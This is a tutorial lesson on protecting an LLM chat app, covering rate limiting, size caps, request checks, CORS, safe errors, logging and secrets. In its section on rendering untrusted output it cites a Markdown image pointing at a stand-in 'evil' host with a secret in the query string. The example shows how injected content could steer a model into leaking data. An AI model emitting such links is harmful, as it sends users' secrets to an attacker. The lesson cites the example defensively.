---
title: Reliability, security and limits
level: medium
time: 40 min
summary: The small, boring protections that keep an LLM app safe and affordable: rate limits, size caps, one reply at a time, safe errors, fail-fast config, secrets, and an honest list of what a real deployment still needs.
tags: rate limiting, validation, CORS, secrets, logging, prompt injection, production
---

A chat app that works in a demo can still be knocked over, drained or abused in an afternoon. Every request here costs real money and holds a connection open for seconds. This lesson is the checklist of protections Streambot has, why each exists, and (just as important) which ones it does **not** have.

## Why LLM apps need limits more than most

One script sending a thousand requests can burn your API budget, a huge paste can overflow the model's context (and can never be answered anyway), and thousands of open streams can exhaust connections. The limits below are the *minimum responsible version* for a single-process project.

## Rate limiting: a sliding window

:::def Rate limiting
Allowing each client only N requests per time window, and answering the rest with HTTP **429 Too Many Requests** and a **`Retry-After`** header saying how long to wait.
:::

```python src="AI/app/core/limits.py" fn="SlidingWindowLimiter"
```

For each key it keeps a `deque` of recent hit times. The key is a **user id** for chat messages and uploads (so one noisy account cannot lock out the others, and changing IP does not dodge the limit) and the **client IP** for sign-in attempts (there is no user yet). Old hits fall off the left side; if the remaining count has reached the limit, it returns *how many seconds until a slot frees up*. The clock is **injected**, which is what makes it testable without waiting. Here it is, with a fake clock you control:

```python run include="AI/app/core/limits.py:SlidingWindowLimiter" title="The real rate limiter, with a fake clock" level=medium
now = [0.0]
limiter = SlidingWindowLimiter(limit=3, window_s=60, clock=lambda: now[0])

def hit(who="alice"):
    wait = limiter.check(who)
    print(f"t={now[0]:5.1f}s  {who:6} ->", "allowed" if wait is None else f"BLOCKED, retry in {wait:.0f}s")

hit(); hit(); hit()                 # three allowed
hit()                               # the fourth is blocked
hit("bob")                          # other clients are unaffected
now[0] = 30; hit()                  # still inside the window
now[0] = 61; hit()                  # the oldest hits expired: allowed again
```

:::warn Limits of this limiter
It lives in one process's memory. With several server processes each would count separately, which is the point at which you move it to Redis or the API gateway. Behind a reverse proxy, `request.client` is the *proxy's* address for everyone, so a real deployment must read a trusted `X-Forwarded-For`. Both are noted in the code, which is the honest way to ship a minimum version.
:::

## Cap the size of a request before reading it

```python src="AI/app/core/limits.py" fn="BodySizeLimitMiddleware"
```

This rejects oversized bodies from the `Content-Length` header **before they are read into memory**. It is a *pure ASGI middleware* on purpose: Starlette's `@app.middleware("http")` wraps responses in a way that interferes with streaming and with detecting a disconnected client, and this app depends on both. Its documented limitation: a chunked upload sends no `Content-Length`, so production also sets a body limit at the reverse proxy.

## Every check, in the right order

All the checks a chat request must pass **before any model money is spent** are in one function:

```python src="AI/app/main.py" from="def prepare_send(" to="return text"
```

| Check | Status | Why |
|---|---|---|
| valid login (a dependency, before this function) | **401** | no token, no access |
| rate limit (per user) | **429** + `Retry-After` | abuse and cost |
| chat exists *and is yours* | **404** | no orphan messages; other people's chats look nonexistent |
| empty text | **422** | nothing to answer |
| too long (`MAX_MESSAGE_CHARS`) | **413** | cost, context overflow, denial of service |
| a reply is already streaming | **409** | see below |

**One reply at a time per conversation (409).** Two concurrent generations would interleave their messages, and each would see a history missing the other. The check is a single indexed query (`has_streaming_message`). The UI also disables sending while a reply streams, so a 409 mostly appears if you fire two requests with `curl`, or press Send within milliseconds of Stop.

## CORS

Browsers refuse to let a page read responses from a different *origin* unless the server explicitly allows it. The frontend (port 3100) and the API (port 8501) are different origins.

```python src="AI/app/config.py" fn="Settings.cors_origin_regex"
```

With no setting, development mode allows the React dev server on **any localhost port** (Vite moves to the next port if one is busy). In production you set `CORS_ORIGINS` to your exact frontend origin(s), and the regex is not used at all.

## Safe errors, and a log that respects privacy

Two rules, both visible in the pipeline code you read earlier:

- **The browser gets a short fixed sentence**, never a raw exception. Exceptions can contain URLs, request ids and configuration. Technical detail goes to the server log only.
- **Conversation text is never logged.** Prompts routinely contain personal or confidential information, and logs are widely accessible and long-lived. The log records ids, model, token counts, cost, latency, status and the error *type*:

```python src="AI/app/chat/streaming.py" from="log.info(" to="len(content),"
```

## Fail fast, with a message that says what to fix

A bad configuration should crash at **startup**, not on the first user's first message:

```python src="AI/app/config.py" fn="Settings.validate"
```

The app has no default model *on purpose*, so it never silently picks a model (and a price) for you, and the placeholder values copied from `.env.example` are rejected too. `run.sh` runs the same validation before starting anything.

## Secrets

- The OpenAI and Tavily keys, and the **`JWT_SECRET`** that signs login tokens, exist only on the server, loaded from `.env`, which is **git-ignored**. A real environment variable beats the `.env` file, which is how deployments inject secrets.
- Anything in a frontend bundle (`VITE_*` variables included) is **public**. The browser never receives a key.
- The history of the public repository was scanned for key patterns before it was pushed.

## The browser is a hostile environment too

The model's output is **untrusted**: it can be steered by whatever it read, including a malicious pasted document or web page. So the client renders it defensively. It is covered in the next lesson, but in one line: Markdown becomes React elements (never `dangerouslySetInnerHTML`), raw HTML is shown as inert text, images are removed (a rendered `![](https://evil/?q=<secret>)` would make *your browser* leak data), and links open with `rel="noopener noreferrer"`.

## Accounts and uploads have their own protections

Two newer features add new ways to be attacked, and each got its own lessons rather than a bullet here: **login** (hashed passwords, signed tokens, vague errors and equal timing, every query filtered by owner: [Accounts and login](#/l/login-and-jwt)) and **file uploads** (layered size caps, content checks, zip-bomb guards, safe error messages, background indexing: [The upload pipeline](#/l/the-upload-pipeline)). The shared theme with everything above: validate before spending, say little to the outside, and make the database the judge of what is allowed.

## What is not here: an honest list

| Missing for real production | Why it matters |
|---|---|
| **Revocable sessions** (refresh tokens, `httpOnly` cookie), email verification, password reset | a 7-day JWT cannot be cancelled early, and `localStorage` is readable by injected scripts |
| **Row-level security and database roles** | a second line of defence behind the `user_id` filters in every query |
| **Shared rate-limit store** (Redis) and per-user budgets | limits that hold across processes and users |
| **Indexing in a worker queue, and OCR** | a restart interrupts indexing today (the file is marked failed), and scanned PDFs cannot be read |
| **Spend alerts and a search/loop ceiling** | an uncapped agent loop can run up a bill |
| **Observability** (traces, metrics, alerts) | know about slowness and errors before users do |
| **Resumable streams** | a dropped connection currently loses the live stream (the saved partial text remains) |
| **Moderation, PII redaction, retention policy** | what you store about people and for how long |
| **CI and a deployment pipeline** | tests run on every change |

Knowing and stating this list is part of the engineering. A project that claims to be production-ready without it is less credible than one that knows exactly how far it goes.

:::keypoints
- Every request costs money, so protect it: **rate limit (429)**, **body-size cap (413)**, **validation (422)**, **one reply at a time (409)**, all *before* the model is called.
- The sliding-window limiter is simple, **testable** (injected clock) and honest about being single-process.
- **CORS** is explicit; dev allows any localhost port, production lists exact origins.
- **Safe errors** for users, details in the server log, and **no conversation text in logs**.
- **Fail fast** on bad configuration, with a message that says what to fix. **Secrets** stay on the server.
- Treat model output, tool output and **uploaded documents** as **untrusted**.
- Rate limit **per user** where you know the user, per IP where you do not.
- Know what is **missing** for production, and say so.
:::

:::exercise Choose the status code
What status should each of these get: (a) a message of 20,000 characters, (b) a second message sent while the first is still streaming, (c) the 21st message within a minute, (d) a message to a conversation that was deleted a second ago?
:::

:::solution Show the answer
(a) **413** (too long, checked before the model is called; the body-size middleware may reject even earlier). (b) **409** (a reply is already running). (c) **429** with `Retry-After`. (d) **404** (the conversation no longer exists). All four are decided in `prepare_send`, before any money is spent.
:::

```quiz
? Why must these checks happen before the stream starts?
- They are slow.
+ After streaming starts the status 200 is already sent; only checks done earlier can return 413, 429, 409 or 404.
- FastAPI forbids exceptions in generators.
> Everything that can fail with a normal status code happens before `StreamingResponse` is returned.

? Why does the limiter take a `clock` parameter?
- To support several time zones.
+ So tests can control time instead of waiting for real seconds to pass.
- It is required by Python.
> Injecting dependencies such as time and the network is what makes the code testable.

? Which is the safest way to handle a provider exception?
- Show its message to the user so they can report it.
+ Log the details on the server and show the user a short fixed sentence.
- Ignore it.
> Raw exceptions can contain URLs, request ids and configuration.
```
